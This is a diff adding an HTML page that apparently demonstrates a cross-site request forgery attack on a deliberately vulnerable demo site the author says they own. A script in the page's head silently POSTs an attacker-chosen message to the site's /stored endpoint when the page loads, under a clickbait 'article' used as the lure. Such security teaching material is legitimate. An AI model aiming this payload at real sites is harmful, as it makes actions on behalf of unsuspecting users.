@@ -1,0 +1,20 @@
+<!-- This executes a CSRF Attack against vcwa.veryveryvulnerable.com, a site I also own -->
+<html>
+<head>
+	<title>Article (and CSRF)</title>
+	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
+
+	<script>
+		console.log('muahaha...');
+		$.post(
+			'http://vcwa.veryveryvulnerable.com/stored',
+			{message: 'POST with any payload the attacker wants... on behalf of a real user...'}
+		);
+	</script>
+</head>
+<body>
+	<h1>As promised, a sensational article.</h1>
+	<p>Maybe this is about celebrities or something.  Or cryptocurrency.  Or something else you'd check out.</p>
+	<p>It's okay, it doesn't need to hold your attention for long, by the time you're reading this, the damage is already done.</p>
+</body>
+</html>
